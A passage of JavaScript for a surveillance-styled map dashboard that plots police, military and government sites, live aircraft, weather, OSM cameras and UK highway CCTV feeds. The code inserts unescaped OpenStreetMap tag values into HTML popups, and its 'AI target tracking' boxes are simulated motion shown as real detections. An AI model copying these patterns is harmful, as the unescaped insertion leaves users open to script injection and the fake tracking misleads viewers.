            const name = tags.name || '';

            if (tags.amenity === 'police') {
                type = 'police'; emoji = '🚔'; cssClass = 'infra-police'; label = name || 'POLICE';
            } else if (tags.amenity === 'hospital') {
                type = 'hospital'; emoji = '🏥'; cssClass = 'infra-hospital'; label = name || 'HOSPITAL';
            } else if (tags.amenity === 'fire_station') {
                type = 'fire'; emoji = '🚒'; cssClass = 'infra-fire'; label = name || 'FIRE DEPT';
            } else if (tags.military) {
                type = 'military'; emoji = '🎖️'; cssClass = 'infra-military'; label = name || 'MILITARY';
            } else if (tags.office === 'government') {
                type = 'government'; emoji = '🏛️'; cssClass = 'infra-government'; label = name || 'GOVERNMENT';
            } else return;

            const icon = L.divIcon({
                className: '',
                html: `
                    <div class="infra-marker ${cssClass}" title="${label}">
                        ${emoji}
                    </div>
                    <div class="infra-label" style="color: inherit;">${label.substring(0, 16).toUpperCase()}</div>
                `,
                iconSize: [22, 22],
                iconAnchor: [11, 11]
            });

            const marker = L.marker([lat, lon], { icon })
                .bindPopup(`
                    <div class="popup-title">${emoji} ${label.toUpperCase()}</div>
                    <div class="popup-info">
                        <strong>Type:</strong> ${type.toUpperCase()}<br>
                        ${tags.operator ? `<strong>Operator:</strong> ${tags.operator}<br>` : ''}
                        ${tags.phone ? `<strong>Phone:</strong> ${tags.phone}<br>` : ''}
                        ${tags['addr:street'] ? `<strong>Address:</strong> ${tags['addr:street']} ${tags['addr:housenumber'] || ''}<br>` : ''}
                        <strong>ID:</strong> OSM #${el.id}
                    </div>
                    <div class="popup-coords">${formatDMS(lat, 'lat')} | ${formatDMS(lon, 'lon')}</div>
                `)
                .addTo(state.map);

            state.infraMarkers.push(marker);
            state.infraData.push({ lat, lon, type, name: label });
        });

        state.liveStats.infra = state.infraData.length;
    }

    // =========================================
    // AIRCRAFT TRACKING (OpenSky Network API)
    // =========================================
    async function loadAircraft() {
        if (!state.mapLayers.aircraft || !state.scanZone) return;

        const b = state.scanZone;
        const url = `https://opensky-network.org/api/states/all?lamin=${b.getSouth().toFixed(4)}&lomin=${b.getWest().toFixed(4)}&lamax=${b.getNorth().toFixed(4)}&lomax=${b.getEast().toFixed(4)}`;

        try {
            const resp = await fetchWithTimeout(url, {}, 12000);
            if (!resp.ok) throw new Error('OpenSky API error');
            const data = await resp.json();

            // Clear old aircraft markers
            state.aircraftMarkers.forEach(m => state.map.removeLayer(m));
            state.aircraftMarkers = [];
            state.aircraftData = [];

            if (data.states) {
                data.states.forEach(s => {
                    const callsign = (s[1] || '').trim();
                    const country = s[2] || '';
                    const lng = s[5];
                    const lat = s[6];
                    const altitude = s[7] || s[13] || 0; // baro_altitude or geo_altitude
                    const velocity = s[9] || 0; // m/s
                    const heading = s[10] || 0; // true_track
                    const vertRate = s[11] || 0;
                    const onGround = s[8];

                    if (lat === null || lng === null) return;

                    const altFt = Math.round(altitude * 3.28084);
                    const spdKts = Math.round(velocity * 1.94384);

                    const iconHtml = `
                        <div style="transform:rotate(${heading}deg);font-size:18px;filter:drop-shadow(0 0 4px rgba(255,68,255,0.6));">
                            ${onGround ? '🛬' : '✈️'}
                        </div>
                    `;

                    const icon = L.divIcon({
                        html: iconHtml,
                        className: 'aircraft-icon',
                        iconSize: [24, 24],
                        iconAnchor: [12, 12]
                    });

                    const marker = L.marker([lat, lng], { icon })
                        .bindPopup(`
                            <div style="font-family:monospace;font-size:12px;min-width:180px;">
                                <b style="color:#ff44ff;">✈ ${callsign || 'UNKNOWN'}</b><br>
                                🏴 ${country}<br>
                                📍 ${lat.toFixed(4)}, ${lng.toFixed(4)}<br>
                                ⬆ ALT: ${altFt.toLocaleString()} ft<br>
                                💨 SPD: ${spdKts} kts (${Math.round(velocity * 3.6)} km/h)<br>
                                🧭 HDG: ${Math.round(heading)}°<br>
                                ${vertRate !== 0 ? `📐 V/S: ${Math.round(vertRate * 196.85)} ft/min<br>` : ''}
                                ${onGround ? '🛬 ON GROUND' : '🛫 AIRBORNE'}
                            </div>
                        `)
                        .addTo(state.map);

                    state.aircraftMarkers.push(marker);
                    state.aircraftData.push({ callsign, lat, lng, altitude, velocity, heading, country });
                });
            }

            state.liveStats.aircraft = state.aircraftData.length;
            updateLiveStats();

            // Auto-refresh every 15 seconds
            if (state.aircraftRefreshInterval) clearInterval(state.aircraftRefreshInterval);
            state.aircraftRefreshInterval = setInterval(() => {
                if (state.mapLayers.aircraft && state.scanZone) loadAircraft();
            }, 15000);

        } catch (e) {
            console.warn('Aircraft API error:', e);
            // Fallback: show message
            showToast('⚠ Aircraft API unavailable — try again later');
        }
    }

    // =========================================
    // WEATHER POPUP (Open-Meteo API)
    // =========================================
    async function fetchWeatherPopup(lat, lng, latlng) {
        // Show loading popup
        const popup = L.popup({ className: 'weather-popup' })
            .setLatLng(latlng)
            .setContent('<div style="font-family:monospace;font-size:12px;color:#00ff41;">⏳ Loading weather...</div>')
            .openOn(state.map);

        // Cache key (rounded to 0.1 deg)
        const cacheKey = `${lat.toFixed(1)}_${lng.toFixed(1)}`;
        const cached = state.weatherCache[cacheKey];
        if (cached && (Date.now() - cached.ts < 300000)) { // 5 min cache
            popup.setContent(formatWeatherHTML(cached.data, lat, lng));
            return;
        }

        try {
            const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat.toFixed(4)}&longitude=${lng.toFixed(4)}&current=temperature_2m,relative_humidity_2m,apparent_temperature,precipitation,wind_speed_10m,wind_direction_10m,wind_gusts_10m,weather_code,cloud_cover,pressure_msl,visibility&timezone=auto`;
            const resp = await fetchWithTimeout(url, {}, 12000);
            if (!resp.ok) throw new Error('Weather API error');
            const data = await resp.json();

            state.weatherCache[cacheKey] = { data, ts: Date.now() };
            popup.setContent(formatWeatherHTML(data, lat, lng));
        } catch (e) {
            popup.setContent('<div style="font-family:monospace;font-size:12px;color:#ff2d2d;">⚠ Weather unavailable</div>');
        }
    }

    function formatWeatherHTML(data, lat, lng) {
        const c = data.current;
        const wmo = getWeatherDescription(c.weather_code);

        return `
            <div style="font-family:monospace;font-size:11px;min-width:200px;line-height:1.7;">
                <div style="font-size:13px;font-weight:700;color:#00ff41;margin-bottom:4px;">🌡️ WEATHER INTEL</div>
                <div style="color:#888;font-size:10px;margin-bottom:6px;">${lat.toFixed(4)}°, ${lng.toFixed(4)}°</div>
                <div>${wmo.icon} <b>${wmo.text}</b></div>
                <div>🌡️ Temp: <b style="color:#ffdd44;">${c.temperature_2m}°C</b> (feels ${c.apparent_temperature}°C)</div>
                <div>💧 Humidity: ${c.relative_humidity_2m}%</div>
                <div>💨 Wind: ${c.wind_speed_10m} km/h ${getWindDir(c.wind_direction_10m)}</div>
                ${c.wind_gusts_10m ? `<div>🌬 Gusts: ${c.wind_gusts_10m} km/h</div>` : ''}
                <div>🌧 Precip: ${c.precipitation} mm</div>
                <div>☁ Clouds: ${c.cloud_cover}%</div>
                <div>🔽 Pressure: ${c.pressure_msl} hPa</div>
                ${c.visibility ? `<div>👁 Visibility: ${(c.visibility/1000).toFixed(1)} km</div>` : ''}
            </div>
        `;
    }

    function getWeatherDescription(code) {
        const wmo = {
            0: { icon: '☀️', text: 'Clear Sky' },
            1: { icon: '🌤', text: 'Mainly Clear' },
            2: { icon: '⛅', text: 'Partly Cloudy' },
            3: { icon: '☁️', text: 'Overcast' },
            45: { icon: '🌫', text: 'Fog' },
            48: { icon: '🌫', text: 'Rime Fog' },
            51: { icon: '🌦', text: 'Light Drizzle' },
            53: { icon: '🌦', text: 'Drizzle' },
            55: { icon: '🌧', text: 'Heavy Drizzle' },
            61: { icon: '🌧', text: 'Light Rain' },
            63: { icon: '🌧', text: 'Rain' },
            65: { icon: '🌧', text: 'Heavy Rain' },
            71: { icon: '🌨', text: 'Light Snow' },
            73: { icon: '🌨', text: 'Snow' },
            75: { icon: '❄️', text: 'Heavy Snow' },
            80: { icon: '🌦', text: 'Rain Showers' },
            81: { icon: '🌧', text: 'Heavy Showers' },
            85: { icon: '🌨', text: 'Snow Showers' },
            95: { icon: '⛈', text: 'Thunderstorm' },
            96: { icon: '⛈', text: 'Thunderstorm + Hail' },
            99: { icon: '⛈', text: 'Severe Thunderstorm' }
        };
        return wmo[code] || { icon: '🌤', text: 'Unknown' };
    }

    function getWindDir(deg) {
        const dirs = ['N','NNE','NE','ENE','E','ESE','SE','SSE','S','SSW','SW','WSW','W','WNW','NW','NNW'];
        return dirs[Math.round(deg / 22.5) % 16];
    }

    // =========================================
    // PUBLIC SURVEILLANCE CAMERAS (OSM)
    // =========================================
    async function loadCameras() {
        if (!state.mapLayers.cameras || !state.scanZone) return;

        const bbox = getBboxString();
        const query = `
            [out:json][timeout:15];
            (
                node["man_made"="surveillance"](${bbox});
                node["highway"="speed_camera"](${bbox});
                node["traffic_calming"="speed_camera"](${bbox});
                node["amenity"="webcam"](${bbox});
            );
            out body;
        `;

        try {
            let data = await queryOverpass(query);
            if (!data || !data.elements || data.elements.length === 0) {
                // Overpass unavailable - fall back to official OSM API
                data = await osmFallbackData(bbox, function (tags) {
                    return tags['man_made'] === 'surveillance' || tags['highway'] === 'speed_camera' || tags['traffic_calming'] === 'speed_camera' || tags['amenity'] === 'webcam';
                }, true);
                if (!data || !data.elements) return;
            }

            state.cameraMarkers.forEach(m => state.map.removeLayer(m));
            state.cameraMarkers = [];
            state.cameras = [];

            data.elements.forEach(el => {
                const lat = el.lat;
                const lon = el.lon;
                const tags = el.tags || {};
                const camType = tags['surveillance:type'] || tags['camera:type'] || (tags['amenity'] === 'webcam' ? 'WEBCAM' : 'CCTV');
                const zone = tags['surveillance:zone'] || tags['surveillance'] || 'public';
                const operator = tags['operator'] || '';
                const direction = tags['camera:direction'] || tags['direction'] || '';
                const isSpeedCam = tags['highway'] === 'speed_camera' || tags['traffic_calming'] === 'speed_camera';
                const imageUrl = tags['url'] || tags['image'] || tags['website'] || tags['contact:webcam'] || tags['webcam:url'] || null;

                const camId = 'osm-' + el.id;
                const camData = {
                    id: camId,
                    osmId: el.id,
                    title: isSpeedCam ? `SPEED CAM #${el.id}` : (tags['name'] || `SURVEILLANCE CAM #${el.id}`),
                    lat,
                    lon,
                    type: isSpeedCam ? 'SPEED CAM' : camType.toUpperCase(),
                    isSpeedCam,
                    zone,
                    operator,
                    direction,
                    image_url: imageUrl,
                    source: 'OpenStreetMap Overpass',
                    tags
                };

                state.cameraCatalog[camId] = camData;

                const icon = L.divIcon({
                    html: `<div style="font-size:16px;filter:drop-shadow(0 0 4px rgba(255,100,0,0.6));cursor:pointer;">${isSpeedCam ? '📸' : '📹'}</div>`,
                    className: 'camera-icon',
                    iconSize: [20, 20],
                    iconAnchor: [10, 10]
                });

                const marker = L.marker([lat, lon], { icon })
                    .bindPopup(`
                        <div style="font-family:monospace;font-size:11px;min-width:180px;line-height:1.6;">
                            <b style="color:#ff6400;">📹 ${isSpeedCam ? 'SPEED CAMERA' : 'SURVEILLANCE CAM'}</b><br>
                            📋 Type: ${camType}<br>
                            🏷️ Zone: ${zone}<br>
                            ${operator ? `🏢 Op: ${operator}<br>` : ''}
                            ${direction ? `🧭 Dir: ${direction}°<br>` : ''}
                            📍 ${lat.toFixed(5)}, ${lon.toFixed(5)}<br>
                            <span style="color:#888;font-size:10px;">OSM #${el.id}</span>
                            <div style="margin-top:8px;">
                                <button class="btn btn-primary" style="width:100%;padding:6px 8px;font-size:11px;display:flex;align-items:center;justify-content:center;gap:6px;" onclick="window.SGP.openCameraModalById('${camId}')">
                                    📹 VIEW CAMERA FEED
                                </button>
                            </div>
                        </div>
                    `)
                    .addTo(state.map);

                marker.on('click', function () {
                    window.SGP.openCameraModalById(camId);
                });

                state.cameraMarkers.push(marker);
                state.cameras.push({ id: camId, lat, lon, type: camType, zone, data: camData });
            });

            state.liveStats.cameras = state.cameras.length;
            updateLiveStats();
        } catch (e) {
            console.warn('Camera load error:', e);
        }
    }

    // =========================================
    // LIVE HIGHWAY CCTV (National Highways, public snapshot JPEGs)
    // =========================================
    const HIGHWAY_CAM_CATALOGUE = 'https://openhighways.uk/api/cameras';
    const HIGHWAY_CAM_MAX = 60;

    async function loadHighwayCams() {
        if (!state.mapLayers.highwayCams || !state.highwayCamLayer) return;

        const b = state.scanZone || state.map.getBounds();

        state.highwayCamMarkers.forEach(m => state.highwayCamLayer.removeLayer(m));
        state.highwayCamMarkers = [];

        try {
            if (!state.highwayCamCatalogue) {
                const resp = await fetchWithTimeout(HIGHWAY_CAM_CATALOGUE, {}, 20000);
                if (!resp.ok) throw new Error('HTTP ' + resp.status);
                state.highwayCamCatalogue = await resp.json();
            }

            const list = state.highwayCamCatalogue.filter(function (c) {
                return c && c.latitude && c.longitude && c.image_url && c.active !== false &&
                    c.latitude <= b.getNorth() && c.latitude >= b.getSouth() &&
                    c.longitude >= b.getWest() && c.longitude <= b.getEast();
            }).slice(0, HIGHWAY_CAM_MAX);

            state.highwayCams = list;

            list.forEach(function (c) {
                const label = c.road || c.name || c.internal_id || 'HIGHWAY CAM';
                const camId = 'hw-' + (c.internal_id || c.id || Math.random().toString(36).substr(2, 9));
                const camData = {
                    id: camId,
                    title: label,
                    road: c.road || '',
                    lat: c.latitude,
                    lon: c.longitude,
                    type: 'HIGHWAY CCTV',
                    image_url: c.image_url,
                    operator: 'National Highways UK',
                    zone: 'Highway Traffic',
                    source: 'National Highways API'
                };

                state.cameraCatalog[camId] = camData;

                const icon = L.divIcon({
                    html: '<div style="font-size:15px;filter:drop-shadow(0 0 4px rgba(0,255,204,0.7));cursor:pointer;">📷</div>',
                    className: 'highway-cam-icon',
                    iconSize: [18, 18],
                    iconAnchor: [9, 9]
                });

                const marker = L.marker([c.latitude, c.longitude], { icon: icon })
                    .bindPopup(
                        '<div style="font-family:monospace;font-size:11px;min-width:210px;line-height:1.6;">' +
                        '<b style="color:#00ffcc;">📷 LIVE TRAFFIC CAM</b><br>' +
                        '🚧 ' + label + '<br>' +
                        '<span style="color:#888;font-size:10px;">ID ' + (c.internal_id || c.id) + '</span><br>' +
                        '<img src="' + c.image_url + '" style="width:100%;margin-top:6px;border:1px solid #00ffcc;border-radius:4px;cursor:pointer;" ' +
                        'onclick="window.SGP.openCameraModalById(\'' + camId + '\')" ' +
                        'onerror="this.alt=\'FEED OFFLINE\';this.style.opacity=0.4"><br>' +
                        '<div style="margin-top:8px;">' +
                        '<button class="btn btn-primary" style="width:100%;padding:6px 8px;font-size:11px;display:flex;align-items:center;justify-content:center;gap:6px;" onclick="window.SGP.openCameraModalById(\'' + camId + '\')">' +
                        '📷 VIEW LIVE FEED' +
                        '</button>' +
                        '</div>' +
                        '</div>',
                        { maxWidth: 260 }
                    )
                    .addTo(state.highwayCamLayer);

                marker.on('click', function () {
                    window.SGP.openCameraModalById(camId);
                });

                state.highwayCamMarkers.push(marker);
            });

            state.liveStats.highwayCams = list.length;
            updateLiveStats();
        } catch (e) {
            console.warn('Highway camera load error:', e);
        }
    }

    // =========================================
    // TACTICAL CAMERA VIEWER & FEED SYSTEM
    // =========================================
    window.SGP.openCameraModalById = function (id) {
        const cam = state.cameraCatalog[id];
        if (cam) {
            openCameraModal(cam);
        } else {
            showToast('⚠ Camera details unavailable');
        }
    };

    function openCameraModal(cam) {
        state.activeCamera = cam;
        state.cameraZoom = 1.0;
        state.cameraPtzX = 0;
        state.cameraPtzY = 0;
        state.cameraTargetDetect = true;

        const modal = document.getElementById('camera-modal');
        if (!modal) return;

        // Populate header details
        document.getElementById('cam-modal-title').textContent = (cam.title || 'CAM FEED').toUpperCase();
        document.getElementById('cam-modal-type-badge').textContent = cam.type || 'CCTV';
        document.getElementById('cam-hud-id').textContent = cam.id;
        document.getElementById('cam-hud-coords').textContent = `LAT: ${cam.lat.toFixed(5)} | LON: ${cam.lon.toFixed(5)}`;

        // Populate footer details
        const metaEl = document.getElementById('cam-modal-meta');
        if (metaEl) {
            metaEl.innerHTML = `
                <b>SOURCE:</b> ${cam.source || 'SGP Surveillance Grid'}<br>
                ${cam.operator ? `<b>OPERATOR:</b> ${cam.operator} &nbsp;|&nbsp; ` : ''}
                ${cam.zone ? `<b>ZONE:</b> ${cam.zone} &nbsp;|&nbsp; ` : ''}
                ${cam.direction ? `<b>DIRECTION:</b> ${cam.direction}°` : ''}
                ${cam.road ? `<b>LOCATION:</b> ${cam.road}` : ''}
            `;
        }

        // Apply vision mode
        setCameraVisionMode(state.cameraVisionMode || 'nvg');
        updateCameraTelemetryDisplay();

        const feedImg = document.getElementById('cam-feed-img');

        if (cam.image_url) {
            feedImg.src = cam.image_url + (cam.image_url.includes('?') ? '&' : '?') + 't=' + Date.now();
            feedImg.classList.remove('hidden');
        } else {
            feedImg.classList.add('hidden');
            feedImg.src = '';
        }

        // Load map tile onto canvas if no direct image stream
        loadCameraMapTile(cam.lat, cam.lon);

        modal.classList.remove('hidden');

        // Start auto-refresh interval for live JPEG streams
        if (state.cameraRefreshTimer) clearInterval(state.cameraRefreshTimer);
        state.cameraRefreshTimer = setInterval(refreshCameraFeed, 5000);

        // Start HUD canvas render loop
        startCameraCanvasLoop();

        showToast(`📹 OPENED CAMERA [${cam.id}]`);
    }

    function closeCameraModal() {
        const modal = document.getElementById('camera-modal');
        if (modal) modal.classList.add('hidden');

        if (state.cameraRefreshTimer) {
            clearInterval(state.cameraRefreshTimer);
            state.cameraRefreshTimer = null;
        }

        if (state.cameraAnimFrame) {
            cancelAnimationFrame(state.cameraAnimFrame);
            state.cameraAnimFrame = null;
        }

        state.activeCamera = null;
    }

    window.SGP.closeCameraModal = function () {
        closeCameraModal();
    };

    function setCameraVisionMode(mode) {
        state.cameraVisionMode = mode;
        const viewport = document.getElementById('cam-feed-viewport');
        const label = document.getElementById('cam-hud-vision-label');

        if (viewport) {
            viewport.className = `camera-feed-viewport filter-${mode}`;
        }

        const modeMap = {
            nvg: '🟢 NVG-3 PHOSPHOR',
            flir: '🔴 FLIR THERMAL',
            cyber: '🔵 MATRIX CYBER',
            normal: '⚪ NATURAL FEED'
        };
        if (label) label.textContent = modeMap[mode] || 'TACTICAL';

        document.querySelectorAll('.cam-mode-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.mode === mode);
        });
    }

    window.SGP.setCameraVisionMode = function (mode) {
        setCameraVisionMode(mode);
    };

    window.SGP.adjustCameraZoom = function (delta) {
        state.cameraZoom = Math.min(8.0, Math.max(1.0, state.cameraZoom + delta));
        const badge = document.getElementById('cam-zoom-value');
        if (badge) badge.textContent = state.cameraZoom.toFixed(1) + 'x';
        updateCameraTelemetryDisplay();
    };

    window.SGP.panCamera = function (dx, dy) {
        state.cameraPtzX += dx;
        state.cameraPtzY += dy;
        updateCameraTelemetryDisplay();
    };

    window.SGP.resetCameraPTZ = function () {
        state.cameraPtzX = 0;
        state.cameraPtzY = 0;
        state.cameraZoom = 1.0;
        const badge = document.getElementById('cam-zoom-value');
        if (badge) badge.textContent = '1.0x';
        updateCameraTelemetryDisplay();
    };

    function updateCameraTelemetryDisplay() {
        const az = ((180 + state.cameraPtzX) % 360 + 360) % 360;
        const elev = Math.max(-45, Math.min(45, state.cameraPtzY));
        const el = document.getElementById('cam-hud-telemetry');
        if (el) {
            el.textContent = `AZ: ${az}° | ELEV: ${elev}° | ZOOM: ${state.cameraZoom.toFixed(1)}x`;
        }
    }

    window.SGP.toggleCameraTargetDetection = function () {
        state.cameraTargetDetect = !state.cameraTargetDetect;
        const btn = document.getElementById('btn-cam-target-detect');
        if (btn) btn.classList.toggle('active', state.cameraTargetDetect);
        showToast(state.cameraTargetDetect ? '🎯 AI TARGET TRACKING ACTIVE' : '🎯 TARGET TRACKING OFF');
    };

    function refreshCameraFeed() {
        if (!state.activeCamera) return;
        const cam = state.activeCamera;
        const feedImg = document.getElementById('cam-feed-img');
        if (cam.image_url && feedImg) {
            feedImg.src = cam.image_url + (cam.image_url.includes('?') ? '&' : '?') + 't=' + Date.now();
        }
    }

    window.SGP.refreshCameraFeed = function () {
        refreshCameraFeed();
        showToast('🔄 CAMERA FEED REFRESHED');
    };

    function loadCameraMapTile(lat, lon) {
        const zoom = 16;
        const tileX = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
        const tileY = Math.floor((1 - Math.log(Math.tan(lat * Math.PI / 180) + 1 / Math.cos(lat * Math.PI / 180)) / Math.PI) / 2 * Math.pow(2, zoom));
        const tileUrl = `https://tile.openstreetmap.org/${zoom}/${tileX}/${tileY}.png`;

        const img = new Image();
        img.crossOrigin = 'Anonymous';
        img.onload = function () {
            state.cameraTileImage = img;
        };
        img.onerror = function () {
            state.cameraTileImage = null;
        };
        img.src = tileUrl;
    }

    function startCameraCanvasLoop() {
        const canvas = document.getElementById('cam-feed-canvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        let scanY = 0;
        let simFrame = 0;

        function renderFrame() {
            if (!state.activeCamera) return;

            const w = canvas.width = canvas.parentElement.clientWidth || 640;
            const h = canvas.height = canvas.parentElement.clientHeight || 320;

            ctx.clearRect(0, 0, w, h);

            const cam = state.activeCamera;

            // Update timestamp
            const timeEl = document.getElementById('cam-hud-timestamp');
            if (timeEl) {
                timeEl.textContent = new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
            }

            // Draw map imagery on canvas if no camera image stream
            if (!cam.image_url) {
                ctx.save();
                ctx.fillStyle = '#0a140a';
                ctx.fillRect(0, 0, w, h);

                if (state.cameraTileImage) {
                    const scale = state.cameraZoom;
                    const offsetX = (w / 2) + (state.cameraPtzX * 2);
                    const offsetY = (h / 2) + (state.cameraPtzY * 2);
                    const drawW = w * scale;
                    const drawH = h * scale;

                    ctx.globalAlpha = 0.85;
                    ctx.drawImage(state.cameraTileImage, offsetX - (drawW / 2), offsetY - (drawH / 2), drawW, drawH);
                    ctx.globalAlpha = 1.0;
                }

                // Grid lines overlay on canvas feed
                ctx.strokeStyle = 'rgba(0, 255, 65, 0.15)';
                ctx.lineWidth = 1;
                const gridSpacing = 40 * state.cameraZoom;
                for (let x = (state.cameraPtzX * 2) % gridSpacing; x < w; x += gridSpacing) {
                    ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, h); ctx.stroke();
                }
                for (let y = (state.cameraPtzY * 2) % gridSpacing; y < h; y += gridSpacing) {
                    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke();
                }

                ctx.restore();
            }

            // Draw Target Detection AI boxes if enabled
            if (state.cameraTargetDetect) {
                simFrame++;
                ctx.save();
                ctx.font = '10px Rajdhani, monospace';

                // Target 1 (e.g. Vehicle)
                const t1X = (w * 0.35 + Math.sin(simFrame * 0.02) * 60 + state.cameraPtzX) % w;
                const t1Y = h * 0.5 + Math.cos(simFrame * 0.015) * 30 + state.cameraPtzY;
                ctx.strokeStyle = '#00ff66';
                ctx.lineWidth = 1.5;
                ctx.strokeRect(t1X - 25, t1Y - 18, 50, 36);
                ctx.fillStyle = '#00ff66';
                ctx.fillText(cam.isSpeedCam ? 'SPEED TARGET: 48 KM/H' : 'VEHICLE #104', t1X - 25, t1Y - 22);

                // Target 2 (Pedestrian / Patrol)
                const t2X = (w * 0.65 - Math.cos(simFrame * 0.025) * 40 + state.cameraPtzX) % w;
                const t2Y = h * 0.6 + Math.sin(simFrame * 0.02) * 20 + state.cameraPtzY;
                ctx.strokeStyle = '#00ccff';
                ctx.strokeRect(t2X - 12, t2Y - 20, 24, 40);
                ctx.fillStyle = '#00ccff';
                ctx.fillText('HUMAN #08', t2X - 12, t2Y - 24);

                ctx.restore();
            }

            // Radar scan sweep line
            scanY = (scanY + 2) % h;
            ctx.strokeStyle = 'rgba(0, 255, 65, 0.3)';
            ctx.lineWidth = 2;
            ctx.beginPath();
            ctx.moveTo(0, scanY);
            ctx.lineTo(w, scanY);
            ctx.stroke();

            state.cameraAnimFrame = requestAnimationFrame(renderFrame);
        }

        renderFrame();
    }

    window.SGP.captureCameraSnapshot = function () {
        if (!state.activeCamera) return;
        const cam = state.activeCamera;
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 360;
        const ctx = canvas.getContext('2d');

        // Draw background
        ctx.fillStyle = '#051005';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        const srcCanvas = document.getElementById('cam-feed-canvas');
        if (srcCanvas) {
            ctx.drawImage(srcCanvas, 0, 0, canvas.width, canvas.height);
        }

        // Draw header branding & telemetry
        ctx.fillStyle = '#00ff66';
        ctx.font = '14px Rajdhani, monospace';
        ctx.fillText(`SGP TACTICAL - INTEL SNAPSHOT [${cam.id}]`, 15, 25);
        ctx.font = '11px Rajdhani, monospace';
        ctx.fillText(`LAT: ${cam.lat.toFixed(5)} | LON: ${cam.lon.toFixed(5)} | TYPE: ${cam.type}`, 15, 45);
        ctx.fillText(`TIME: ${new Date().toISOString()}`, 15, 65);

        // Download PNG link
        const a = document.createElement('a');
        a.download = `SGP_CAM_INTEL_${cam.id}_${Date.now()}.png`;
        a.href = canvas.toDataURL('image/png');
        a.click();

        showToast('📸 CAMERA INTEL SNAPSHOT DOWNLOADED');
    };

    window.SGP.toggleCameraFullscreen = function () {
        const viewport = document.getElementById('cam-feed-viewport');
        if (!viewport) return;

        if (!document.fullscreenElement) {
            viewport.requestFullscreen?.().catch(() => {});
        } else {
            document.exitFullscreen?.().catch(() => {});
        }
    };

    // =========================================
    // INTERNATIONAL RADIO (Radio Browser API)
    // =========================================
    async function loadRadioStations(countryCode) {
        if (!countryCode) countryCode = await getCountryFromCoords();
        if (!countryCode) { showToast('⚠ Could not detect country'); return; }

        try {
            const resp = await fetchWithTimeout(`https://de1.api.radio-browser.info/json/stations/bycountrycodeexact/${countryCode}?limit=50&order=clickcount&reverse=true&hidebroken=true`, {}, 10000);
            if (!resp.ok) throw new Error('Radio API error');
            state.radioStations = await resp.json();
            if (state.panelOpen === 'layers') openPanel('layers');
            showToast(`📻 ${state.radioStations.length} stations found`);
        } catch (e) {
            console.warn('Radio API error:', e);
            showToast('⚠ Radio stations unavailable');
        }
    }

    async function getCountryFromCoords() {
        try {
            const c = state.map.getCenter();
            const resp = await fetchWithTimeout(`https://nominatim.openstreetmap.org/reverse?lat=${c.lat}&lon=${c.lng}&format=json&zoom=3`, {}, 10000);
            const data = await resp.json();
            return data.address?.country_code?.toUpperCase() || null;
        } catch (e) { return null; }
    }

    window.SGP.playRadio = function(url, name) {
        if (state.radioAudio) { state.radioAudio.pause(); state.radioAudio = null; }
        if (state.currentStation === url) { state.currentStation = null; state.radioPlaying = false; if (state.panelOpen === 'layers') openPanel('layers'); return; }
        state.radioAudio = new Audio(url);
        state.radioAudio.volume = 0.7;
        state.radioAudio.play().catch(e => showToast('⚠ Stream unavailable'));
        state.currentStation = url;
        state.radioPlaying = true;
        showToast(`📻 Playing: ${name}`);
        if (state.panelOpen === 'layers') openPanel('layers');
    };

    window.SGP.stopRadio = function() {
        if (state.radioAudio) { state.radioAudio.pause(); state.radioAudio = null; }
        state.currentStation = null;
        state.radioPlaying = false;
        if (state.panelOpen === 'layers') openPanel('layers');
    };

    window.SGP.loadRadio = function() {
        loadRadioStations();
    };

    window.SGP.setRadioVolume = function(vol) {
        if (state.radioAudio) state.radioAudio.volume = vol;
    };

    // =========================================
    // ROADS FOR TRAFFIC SIMULATION (REAL DATA)
    // =========================================
    async function loadRoads() {
        if (!state.mapLayers.traffic) return;

        const bbox = getBboxString();
        const query = `
            [out:json][timeout:30];
            (
                way["highway"="motorway"](${bbox});
                way["highway"="trunk"](${bbox});
                way["highway"="primary"](${bbox});
                way["highway"="secondary"](${bbox});
                way["highway"="tertiary"](${bbox});
            );
            out body;
            >;
            out skel qt;
        `;

        let data = await queryOverpass(query);
        if (!data || !data.elements || data.elements.length === 0) {
            // Overpass unavailable - fall back to the official OSM API
            data = await osmFallbackData(bbox, function (tags) { return !!ROAD_CONFIG[tags['highway']]; }, false);
            if (!data || !data.elements) return;
        }

        // Build node lookup
        const nodes = {};
        data.elements.forEach(el => {
            if (el.type === 'node') {
                nodes[el.id] = [el.lat, el.lon];
            }
        });

        // Build road segments
        state.roads = [];
        data.elements.forEach(el => {
            if (el.type !== 'way' || !el.tags) return;
            const roadType = el.tags.highway;
            if (!ROAD_CONFIG[roadType]) return;

            const coords = [];
            (el.nodes || []).forEach(nodeId => {
                if (nodes[nodeId]) coords.push(nodes[nodeId]);
            });

            if (coords.length >= 2) {
                state.roads.push({
                    coords,
                    type: roadType,
                    name: el.tags.name || el.tags.ref || '',
                    oneway: el.tags.oneway === 'yes',
                    lanes: parseInt(el.tags.lanes) || 2
                });
            }
        });

        // Generate vehicles on these roads
        generateVehicles();
    }

    // =========================================
    // VEHICLE GENERATION
    // =========================================
    function generateVehicles() {
        // Clear old vehicles
        state.vehicleLayer.clearLayers();
        state.vehicles = [];

        if (state.roads.length === 0) return;

        // Calculate road lengths and distribute vehicles
        const roadSegments = [];
        state.roads.forEach(road => {
            const config = ROAD_CONFIG[road.type];
            let totalLength = 0;
            for (let i = 1; i < road.coords.length; i++) {
                const dx = road.coords[i][0] - road.coords[i - 1][0];
                const dy = road.coords[i][1] - road.coords[i - 1][1];
                totalLength += Math.sqrt(dx * dx + dy * dy);
            }
            roadSegments.push({ ...road, totalLength, config });
        });

        // Distribute vehicles based on road type density
        let totalVehicles = 0;
        roadSegments.forEach(road => {
            if (totalVehicles >= MAX_VEHICLES) return;

            // Number of vehicles proportional to road length & density
            const numVehicles = Math.min(
                Math.ceil(road.totalLength * road.config.density * 40000),
                Math.max(1, Math.floor(MAX_VEHICLES / state.roads.length * 2))
            );

            for (let i = 0; i < numVehicles && totalVehicles < MAX_VEHICLES; i++) {
                const vehicle = createVehicle(road);
                if (vehicle) {
                    state.vehicles.push(vehicle);
                    totalVehicles++;
                }
            }
        });

        state.liveStats.vehicles = state.vehicles.length;
    }

    function createVehicle(road) {
